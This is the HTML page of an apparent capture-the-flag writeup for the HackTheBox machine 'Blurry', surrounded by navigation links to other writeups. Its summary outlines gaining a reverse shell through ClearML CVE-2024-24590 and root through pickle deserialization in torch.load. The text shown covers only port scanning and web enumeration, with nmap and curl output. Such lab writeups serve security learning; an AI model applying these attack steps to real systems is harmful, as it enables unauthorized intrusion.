@@ -1,0 +1,1943 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=18d79529ed1a410777646c1aaed0e478c964ecf8">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Blurry writeup | Gabriel blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="HTB Blurry writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Blurry is a medium linux machine from HackTheBox that involves ClearML and pickle exploitation. First, I will abuse a ClearML instance by exploiting CVE-2024-24590 to gain a reverse shell as jippity. From that access, I am able to execute a custom script as root because sudoers privileges that uses torch.load to import a pickle model. I will serialize data used to execute a shell and gain access as root." />
+<meta property="og:description" content="Blurry is a medium linux machine from HackTheBox that involves ClearML and pickle exploitation. First, I will abuse a ClearML instance by exploiting CVE-2024-24590 to gain a reverse shell as jippity. From that access, I am able to execute a custom script as root because sudoers privileges that uses torch.load to import a pickle model. I will serialize data used to execute a shell and gain access as root." />
+<link rel="canonical" href="http://localhost:4000/writeups/HTB/Blurry.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/HTB/Blurry.html" />
+<meta property="og:site_name" content="Gabriel blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-10-12T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Blurry writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-10-12T00:00:00+02:00","datePublished":"2024-10-12T00:00:00+02:00","description":"Blurry is a medium linux machine from HackTheBox that involves ClearML and pickle exploitation. First, I will abuse a ClearML instance by exploiting CVE-2024-24590 to gain a reverse shell as jippity. From that access, I am able to execute a custom script as root because sudoers privileges that uses torch.load to import a pickle model. I will serialize data used to execute a shell and gain access as root.","headline":"HTB Blurry writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/HTB/Blurry.html"},"url":"http://localhost:4000/writeups/HTB/Blurry.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel blog</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href = "/writeups">Writeups</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/blog">Blog</a>
+    
+    
+</small>
+
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Blurry.html"> HTB Blurry writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;clearml/&gt; &lt;machine-learning/&gt; &lt;CVE-2024-24590/&gt; &lt;pickle/&gt; &lt;deserialization/&gt; &lt;python-torch/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Freelancer.html"> HTB Freelancer writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forgot-password/&gt; &lt;idor/&gt; &lt;qrcode/&gt; &lt;mssql/&gt; &lt;xp_cmdshell/&gt; &lt;sql-configuration/&gt; &lt;crash-dump-analysis/&gt; &lt;active-directory-acls/&gt; &lt;genericwrite/&gt; &lt;nt-hashes/&gt; &lt;secretsdump/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Boardlight.html"> HTB Boardlight writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;dolibarr/&gt; &lt;CVE-2023-30253/&gt; &lt;subdomain-enumeration/&gt; &lt;crm/&gt; &lt;erp/&gt; &lt;php-injection/&gt; &lt;php-configuration/&gt; &lt;mysql/&gt; &lt;password-reuse/&gt; &lt;suid/&gt; &lt;enlightenment/&gt; &lt;CVE-2022-37706/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Solarlab.html"> HTB Solarlab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;smb/&gt; &lt;spreadsheet/&gt; &lt;libreoffice/&gt; &lt;bruteforcing-web/&gt; &lt;rce/&gt; &lt;CVE-2023-33733/&gt; &lt;pdf/&gt; &lt;openfire-exploit/&gt; &lt;CVE-2023-32315/&gt; &lt;openfire-database/&gt; &lt;decrypt-password/&gt; &lt;java/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Intuition.html"> HTB Intuition writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;cookie-hijacking/&gt; &lt;cve-2023-24329/&gt; &lt;urllib/&gt; &lt;ssrf/&gt; &lt;ssrf-to-lfi/&gt; &lt;url-wrappers/&gt; &lt;ftp/&gt; &lt;ssh-key/&gt; &lt;ssh-key-comments/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;binary-analysis/&gt; &lt;suricata-logs/&gt; &lt;sudoers/&gt; &lt;ghidra/&gt; &lt;command-execution/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Mailing.html"> HTB Mailing writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;hMailServer/&gt; &lt;hMailServer-configuration/&gt; &lt;hash-cracking/&gt; &lt;outlook-vulnerabilities/&gt; &lt;CVE-2024-21413/&gt; &lt;ntlm-hash/&gt; &lt;libreoffice-odt-exploit/&gt; &lt;CVE-2023-2255/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Skyfall.html"> HTB Skyfall writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forbidden-bypass/&gt; &lt;minio-cloud/&gt; &lt;minio-cve/&gt; &lt;CVE-2023-28432/&gt; &lt;hashicorp-vault/&gt; &lt;vault-ssh/&gt; &lt;sudoers/&gt; &lt;vault-unseal/&gt; &lt;race-condition/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Runner.html"> HTB Runner writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/FormulaX.html"> HTB FormulaX writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Usage.html"> HTB Usage writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/IClean.html"> HTB IClean writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Headless.html"> HTB Headless writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Corporate.html"> HTB Corporate writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Perfection.html"> HTB Perfection writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Jab.html"> HTB Jab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Office.html"> HTB Office writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Crafty.html"> HTB Crafty writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Pov.html"> HTB Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Analysis.html"> HTB Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Bizness.html"> HTB Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Ouija.html"> HTB Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Monitored.html"> HTB Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Napper.html"> HTB Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Surveillance.html"> HTB Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Hospital.html"> HTB Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Codify.html"> HTB Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HTB Blurry writeup</span> <span class="points"> [30 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+
+<p>Blurry is a medium linux machine from HackTheBox that involves ClearML and pickle exploitation. First, I will abuse a ClearML instance by exploiting <a href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/">CVE-2024-24590</a> to gain a reverse shell as jippity. From that access, I am able to execute a custom script as root because sudoers privileges that uses <code>torch.load</code> to import a pickle model. I will serialize data used to execute a shell and gain access as root.</p>
+    
+      <h1 id="ports-recognaissance">
+        
+        
+          Ports recognaissance <a href="#ports-recognaissance" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>As always, I will start enumerating the ports of the machine IP with <code>nmap</code> to identify services to pentest:</p>
+
+<pre><code class="language-bash">❯ sudo nmap -sS -p- --open --min-rate 5000 -v -n -Pn -sVC 10.10.11.19 -oA blurry
+</code></pre>
+
+<pre><code class="language-bash">❯ cat blurry.nmap
+# Nmap 7.94SVN scan initiated Sat Oct 12 09:50:07 2024 as: nmap -sS -p- --open --min-rate 5000 -v -n -Pn -sVC -oA blurry 10.10.11.19
+Nmap scan report for 10.10.11.19
+Host is up (0.092s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp open  http    nginx 1.18.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://app.blurry.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Oct 12 09:50:30 2024 -- 1 IP address (1 host up) scanned in 23.55 seconds
+</code></pre>
+
+<ul>
+  <li><code>-sVC</code>: Identifies service and version.</li>
+  <li><code>-p-</code>: scans all the range of ports (1-65535).</li>
+  <li><code>--open</code>: shows only open ports and not filtered or closed.</li>
+  <li><code>-sS</code>: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li><code>--min-rate 5000</code>: Sends 5000 packets per second to improve velocity (don’t do this in a real environment).</li>
+  <li><code>-n</code>: Disables DNS resolution protocol.</li>
+  <li><code>-v</code>: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li><code>-Pn</code>: Disables host discovery protocol (ping).</li>
+  <li><code>-oA &lt;file&gt;</code>: Exports the evidence to multiple files in different formats.</li>
+</ul>
+    
+      <h2 id="port-22">
+        
+        
+          <strong>Port 22:</strong> <a href="#port-22" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+<p>SSH. Useful if I get creds or keys. But it’s not the case.</p>
+    
+      <h2 id="port-80">
+        
+        
+          <strong>Port 80:</strong> <a href="#port-80" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>HTTP. From the Server header it’s extracted that it consists on nginx 1.18.0. Also, in the title I can see it redirects to app.blurry.htb so I will add it to my /etc/hosts for my system to know to where should solve that domain:</p>
+
+<pre><code class="language-bash">❯ sudo vi /etc/hosts
+10.10.11.19 blurry.htb app.blurry.htb
+</code></pre>
+    
+      <h1 id="web-enumeration-port-80">
+        
+        
+          Web enumeration (Port 80) <a href="#web-enumeration-port-80" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>From nmap, I extracted that the web gets redirected to app.blurry.htb. This subdomain doesn’t have any interesting header but in the title I can see “ClearML”:</p>
+
+<pre><code class="language-bash">❯ curl -s -i http://app.blurry.htb | less
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Sat, 12 Oct 2024 09:19:17 GMT
+Content-Type: text/html
+Content-Length: 13327
+Connection: keep-alive
+Last-Modified: Thu, 14 Dec 2023 09:38:26 GMT
+ETag: "657acd12-340f"
+Accept-Ranges: bytes
+
+&lt;!doctype html&gt;
+&lt;html lang="en" data-critters-container&gt;
+&lt;head&gt;
+  &lt;meta charset="utf-8"&gt;
+  &lt;title&gt;ClearML&lt;/title&gt;
+  &lt;base href="/"&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt;
+  &lt;link rel="icon" type="image/x-icon" href="favicon.ico?v=7"&gt;
+  &lt;link href="app/webapp-common/assets/fonts/heebo.css" rel="stylesheet" media="print" onload="this.media='all'"&gt;&lt;noscript&gt;&lt;link rel="stylesheet" href="app/webapp-common/assets/fonts/heebo.css"&gt;&lt;/noscript&gt;
